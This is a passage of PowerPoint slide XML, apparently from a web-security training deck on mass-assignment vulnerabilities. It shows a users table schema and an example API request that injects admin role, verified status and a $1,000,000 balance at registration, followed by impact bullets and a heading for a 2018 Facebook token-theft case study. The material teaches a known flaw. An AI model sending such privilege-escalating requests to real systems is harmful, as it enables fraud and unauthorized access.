            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5336977"/>
            <a:ext cx="1786176" cy="223242"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Database Schema:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5645229"/>
            <a:ext cx="7825502" cy="1530906"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="5645229"/>
            <a:ext cx="7836694" cy="1530906"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="5730240"/>
            <a:ext cx="7609999" cy="1360884"/>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CREATE TABLE users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id INT PRIMARY KEY,</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username VARCHAR(50),</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email VARCHAR(100),</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password_hash VARCHAR(255),</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role VARCHAR(20) DEFAULT 'user', -- Should be 'user' by default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is_verified BOOLEAN DEFAULT FALSE,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account_balance DECIMAL(10,2) DEFAULT 0.00,</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created_at TIMESTAMP</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322915" y="1234083"/>
            <a:ext cx="3037523" cy="379571"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2350" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3322915" y="1761053"/>
            <a:ext cx="2636401" cy="227767"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 1: Normal user registration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3322915" y="2055138"/>
            <a:ext cx="3851077" cy="3108722"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1563"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3317200" y="2055138"/>
            <a:ext cx="3862507" cy="3108722"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 558"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3432810" y="2141815"/>
            <a:ext cx="3631287" cy="2935367"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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POST /api/users</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Content-Type: application/json</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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"username": "newuser",</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"email": "newuser@example.com",</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"password": "password123"</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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Response:</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"message": "User created",</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"user": {</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"id": 501,</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"username": "newuser",</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"email": "newuser@example.com",</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"role": "user",</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"is_verified": false,</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"account_balance": 0.00</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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7380446" y="1702118"/>
            <a:ext cx="4017764" cy="3947398"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD">
              <a:alpha val="95000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7496056" y="1761053"/>
            <a:ext cx="2583180" cy="227767"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 2: Mass assignment attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7496056" y="2055138"/>
            <a:ext cx="3786545" cy="3528060"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1378"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7490341" y="2055138"/>
            <a:ext cx="3797975" cy="3528060"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 492"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7605951" y="2141815"/>
            <a:ext cx="3566755" cy="3354705"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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POST /api/users</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Content-Type: application/json</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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"username": "attacker",</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"email": "attacker@evil.com",</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"password": "password123",</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"role": "admin",              ← INJECTED</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"is_verified": true,          ← INJECTED</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"account_balance": 1000000.00 ← INJECTED</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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Response:</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"message": "User created",</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"user": {</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"id": 502,</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"username": "attacker",</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"email": "attacker@evil.com",</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"role": "admin",              ← SUCCESS!</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"is_verified": true,          ← SUCCESS!</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"account_balance": 1000000.00 ← SUCCESS!</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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3322915" y="5737979"/>
            <a:ext cx="1822490" cy="227767"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Impact:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3322915" y="6054209"/>
            <a:ext cx="1951911" cy="941189"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5164"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3446145" y="6177439"/>
            <a:ext cx="1705451" cy="379809"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Instant admin privileges</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3446145" y="6592610"/>
            <a:ext cx="1705451" cy="279559"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Complete system access without authorization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5333762" y="6054209"/>
            <a:ext cx="1951911" cy="941189"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5164"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5456992" y="6177439"/>
            <a:ext cx="1705451" cy="379809"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Bypassed email verification</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5456992" y="6592610"/>
            <a:ext cx="1705451" cy="279559"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>No need to verify email address</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7344608" y="6054209"/>
            <a:ext cx="1951911" cy="941189"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5164"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7467838" y="6177439"/>
            <a:ext cx="1705451" cy="379809"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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$1,000,000 fraudulent balance</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7467838" y="6592610"/>
            <a:ext cx="1705451" cy="279559"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Arbitrary account balance injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9355455" y="6054209"/>
            <a:ext cx="1951911" cy="941189"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5164"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9478685" y="6177439"/>
            <a:ext cx="1705451" cy="379809"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Complete system compromise</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9478685" y="6592610"/>
            <a:ext cx="1705451" cy="139779"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Full control over application</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315200" y="0"/>
            <a:ext cx="7315200" cy="8229600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="1146334"/>
            <a:ext cx="5727621" cy="1488519"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4650" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>8. Real-World Case Studies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="2975015"/>
            <a:ext cx="5727621" cy="4108133"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="8050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="6450" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>8.1 Facebook - View As Vulnerability (2018)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="64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78882" y="745927"/>
            <a:ext cx="4088606" cy="308610"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Facebook Access Token Theft (2018)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="578882" y="1151334"/>
            <a:ext cx="817959" cy="145137"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 21779"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>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5318" y="1186220"/>
            <a:ext cx="75248" cy="75248"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
